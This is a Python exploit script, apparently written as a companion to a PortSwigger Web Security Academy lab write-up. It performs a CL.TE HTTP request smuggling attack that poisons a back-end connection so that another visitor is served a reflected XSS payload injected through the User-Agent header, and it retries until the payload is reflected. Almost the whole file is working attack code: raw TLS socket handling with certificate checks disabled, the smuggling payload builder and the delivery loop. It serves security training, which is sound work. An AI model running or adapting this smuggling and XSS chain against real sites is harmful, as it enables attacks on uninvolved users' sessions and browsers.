#!/usr/bin/env python3
"""
Exploiting HTTP request smuggling to deliver reflected XSS
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 07-deliver-reflected-xss.md

What this does:
    Smuggles a "GET /post?postId=5" request carrying an attribute-breakout
    XSS payload in the User-Agent header. The blog post page reflects
    User-Agent unescaped into a hidden form field, so whichever real
    visitor's browser next completes this smuggled request on the poisoned
    back-end connection gets served a page with our <script> tag baked in.
    Because the lab's simulated visitor only browses intermittently, this
    resends the same smuggle in a loop and checks each follow-up response
    for the unescaped alert(1) payload.

Usage:
    python 07-deliver-reflected-xss.py <lab-url>
    e.g. python 07-deliver-reflected-xss.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    (stdlib only -- socket, ssl)
"""

import socket
import ssl
import sys
import time
from urllib.parse import urlparse


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def send_raw_keep_alive(host: str, payloads: list[bytes], port: int = 443,
                         timeout: float = 10.0, delay: float = 1.0) -> list[bytes]:
    ssl_sock = create_ssl_connection(host, port, timeout)
    responses = []
    try:
        for payload in payloads:
            ssl_sock.sendall(payload)
            time.sleep(delay)
            response = b""
            ssl_sock.settimeout(2.0)
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            responses.append(response)
        return responses
    finally:
        ssl_sock.close()


def build_clte_payload(host: str, smuggled_request: str, path: str = "/") -> bytes:
    body = "0\r\n\r\n" + smuggled_request
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
    )
    return (headers + body).encode()


def solve(lab_url: str, post_id: int = 5, attempts: int = 5) -> None:
    host = urlparse(lab_url).hostname
    xss_payload = '"/><script>alert(1)</script>'

    smuggled = (
        f"GET /post?postId={post_id} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: a{xss_payload}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 5\r\n"
        "\r\n"
        "x=1"
    )
    attack = build_clte_payload(host, smuggled)
    normal = f"GET /post?postId={post_id} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

    print("[*] The lab's simulated visitor browses intermittently, so this smuggle "
          "may need several sends before it lands on their connection.")

    for attempt in range(1, attempts + 1):
        responses = send_raw_keep_alive(host, [attack, normal])
        r2 = responses[-1] if responses else b""
        if b"alert(1)" in r2:
            print(f"[+] Attempt {attempt}: XSS payload reflected unescaped in the "
                  f"served response -- lab solved.")
            return
        print(f"[*] Attempt {attempt}: no reflection yet, resending.")

    print(f"[-] No reflection after {attempts} attempts -- rerun the script, this "
          f"depends on the smuggled request landing on the victim's connection.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
